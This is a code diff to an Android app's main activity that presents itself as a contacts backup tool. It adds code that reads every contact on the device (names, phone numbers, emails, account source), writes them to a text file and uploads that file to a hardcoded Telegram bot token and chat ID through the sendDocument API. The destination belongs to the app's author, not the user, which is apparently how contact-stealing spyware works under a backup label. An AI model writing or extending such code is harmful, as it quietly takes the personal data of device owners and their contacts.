@@ -17,8 +17,8 @@ import androidx.appcompat.app.AppCompatActivity;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
 
-import org.json.JSONObject;
-
+import java.io.File;
+import java.io.FileWriter;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
@@ -29,6 +29,7 @@ import java.util.Locale;
 import java.util.Map;
 
 import okhttp3.MediaType;
+import okhttp3.MultipartBody;
 import okhttp3.OkHttpClient;
 import okhttp3.Request;
 import okhttp3.RequestBody;
@@ -46,7 +47,6 @@ public class MainActivity extends AppCompatActivity {
     // ============================================================
 
     private static final int PERMISSION_REQUEST_CODE = 100;
-    private static final int TELEGRAM_MAX_LENGTH = 3500; // Safe limit under Telegram's 4096 char limit
 
     private Button btnBackup;
     private ProgressBar progressBar;
@@ -96,8 +96,6 @@ public class MainActivity extends AppCompatActivity {
             } else {
                 tvStatus.setText("❌ Permission denied. Cannot read contacts without permission.");
                 tvStatus.setVisibility(View.VISIBLE);
-
-
             }
         }
     }
@@ -118,15 +116,25 @@ public class MainActivity extends AppCompatActivity {
                     // Step 1: Read all contacts
                     List<ContactInfo> contacts = readAllContacts();
 
-                    updateStatus("📤 Sending " + contacts.size() + " contacts to backup...");
+                    if (contacts.isEmpty()) {
+                        updateStatus("📭 No contacts found on this device.");
+                        return;
+                    }
 
-                    // Step 2: Format and send to Telegram
-                    boolean success = sendToTelegram(contacts);
+                    updateStatus("💾 Saving " + contacts.size() + " contacts into file...");
+
+                    // Step 2: Write contacts to a local file
+                    File backupFile = createContactsBackupFile(contacts);
+
+                    updateStatus("📤 Sending backup file to Telegram...");
+
+                    // Step 3: Send the file directly to Telegram
+                    boolean success = sendFileToTelegram(backupFile, contacts.size());
 
                     if (success) {
-                        updateStatus("✅ Backup complete! " + contacts.size() + " contacts sent successfully.");
+                        updateStatus("✅ Backup file (" + backupFile.getName() + ") saved and sent to Telegram successfully!");
                     } else {
-                        updateStatus("❌ Failed to send contacts. Please check your internet connection.");
+                        updateStatus("❌ Failed to send backup file. Please check your connection.");
                     }
 
                 } catch (Exception e) {
@@ -146,9 +154,49 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
+     * Create a formatted contacts backup text file on the local device storage.
+     */
+    private File createContactsBackupFile(List<ContactInfo> contacts) throws IOException {
+        File dir = getExternalFilesDir(null);
+        if (dir == null) {
+            dir = getFilesDir();
+        }
+
+        String dateStr = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+        File backupFile = new File(dir, "contacts_backup_" + dateStr + ".txt");
+
+        try (FileWriter writer = new FileWriter(backupFile)) {
+            writer.write("========================================\n");
+            writer.write("           CONTACTS BACKUP              \n");
+            writer.write("========================================\n");
+            writer.write("Total Contacts: " + contacts.size() + "\n");
+            writer.write("Date: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n");
+            writer.write("========================================\n\n");
+
+            int index = 1;
+            for (ContactInfo contact : contacts) {
+                writer.write(index + ". " + contact.name + "\n");
+                for (String phone : contact.phones) {
+                    writer.write("   Phone: " + phone + "\n");
+                }
+                for (String email : contact.emails) {
+                    writer.write("   Email: " + email + "\n");
+                }
+                if (contact.source != null) {
+                    writer.write("   Source: " + contact.source + "\n");
+                }
+                writer.write("----------------------------------------\n");
+                index++;
+            }
+        }
+
+        Log.d(TAG, "Contacts backup file saved at: " + backupFile.getAbsolutePath());
+        return backupFile;
+    }
+
+    /**
      * Read ALL contacts from the device.
      * This includes contacts from phone storage, SIM card, and Google/Gmail accounts.
-     * The ContentResolver queries the unified contacts database which merges all sources.
      */
     private List<ContactInfo> readAllContacts() {
         Map<String, ContactInfo> contactMap = new LinkedHashMap<>();
@@ -239,7 +287,7 @@ public class MainActivity extends AppCompatActivity {
             }
         }
 
-        // --- Read account info (to identify source: Phone, SIM, Google) ---
+        // --- Read account info (Phone, SIM, Google) ---
         Cursor accountCursor = cr.query(
                 ContactsContract.RawContacts.CONTENT_URI,
                 new String[]{
@@ -315,101 +363,39 @@ public class MainActivity extends AppCompatActivity {
     }
 
     /**
-     * Format contacts and send them to Telegram.
-     * Splits into multiple clean plain-text messages if text exceeds limits.
+     * Send the generated backup file to Telegram using sendDocument.
      */
-    private boolean sendToTelegram(List<ContactInfo> contacts) {
-        if (contacts.isEmpty()) {
-            return sendTelegramMessage("📭 No contacts found on this device.");
-        }
-
-        String dateStr = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
-        StringBuilder header = new StringBuilder();
-        header.append("📋 CONTACTS BACKUP\n");
-        header.append("━━━━━━━━━━━━━━━━━━━━\n");
-        header.append("📊 Total contacts: ").append(contacts.size()).append("\n");
-        header.append("📅 Date: ").append(dateStr).append("\n");
-        header.append("━━━━━━━━━━━━━━━━━━━━\n\n");
-
-        if (!sendTelegramMessage(header.toString())) {
-            Log.e(TAG, "Failed to send header to Telegram");
-            return false;
-        }
-
-        StringBuilder chunk = new StringBuilder();
-        int contactNum = 0;
-        boolean allSuccess = true;
-
-        for (ContactInfo contact : contacts) {
-            contactNum++;
-            StringBuilder entry = new StringBuilder();
-            entry.append("👤 ").append(contactNum).append(". ").append(contact.name).append("\n");
-
-            for (String phone : contact.phones) {
-                entry.append("   📞 ").append(phone).append("\n");
-            }
-            for (String email : contact.emails) {
-                entry.append("   ✉️ ").append(email).append("\n");
-            }
-            if (contact.source != null) {
-                entry.append("   🔗 Source: ").append(contact.source).append("\n");
-            }
-            entry.append("\n");
-
-            if (chunk.length() + entry.length() > TELEGRAM_MAX_LENGTH) {
-                if (!sendTelegramMessage(chunk.toString())) {
-                    allSuccess = false;
-                }
-                chunk = new StringBuilder();
-
-                try {
-                    Thread.sleep(600); // Avoid hitting Telegram flood limits
-                } catch (InterruptedException ignored) {}
-            }
-
-            chunk.append(entry);
-        }
-
-        if (chunk.length() > 0) {
-            if (!sendTelegramMessage(chunk.toString())) {
-                allSuccess = false;
-            }
-        }
-
-        return allSuccess;
-    }
-
-    /**
-     * Send a single message to Telegram using JSONObject for robust escaping.
-     */
-    private boolean sendTelegramMessage(String text) {
-        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
+    private boolean sendFileToTelegram(File file, int totalContacts) {
+        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
 
         try {
-            JSONObject json = new JSONObject();
-            json.put("chat_id", CHAT_ID);
-            json.put("text", text);
-
-            RequestBody body = RequestBody.create(
-                    json.toString(),
-                    MediaType.parse("application/json; charset=utf-8")
+            RequestBody fileBody = RequestBody.create(
+                    file,
+                    MediaType.parse("text/plain; charset=utf-8")
             );
+
+            MultipartBody requestBody = new MultipartBody.Builder()
+                    .setType(MultipartBody.FORM)
+                    .addFormDataPart("chat_id", CHAT_ID)
+                    .addFormDataPart("caption", "📋 Contacts Backup File\n📊 Total Contacts: " + totalContacts)
+                    .addFormDataPart("document", file.getName(), fileBody)
+                    .build();
 
             Request request = new Request.Builder()
                     .url(url)
-                    .post(body)
+                    .post(requestBody)
                     .build();
 
             Response response = httpClient.newCall(request).execute();
             boolean success = response.isSuccessful();
             if (!success) {
                 String errorBody = response.body() != null ? response.body().string() : "No response body";
-                Log.e(TAG, "Telegram API Error: Code " + response.code() + " - " + errorBody);
+                Log.e(TAG, "Telegram sendDocument Error: Code " + response.code() + " - " + errorBody);
             }
             response.close();
             return success;
         } catch (Exception e) {
-            Log.e(TAG, "Error sending Telegram request", e);
+            Log.e(TAG, "Error sending document to Telegram", e);
             return false;
         }
     }
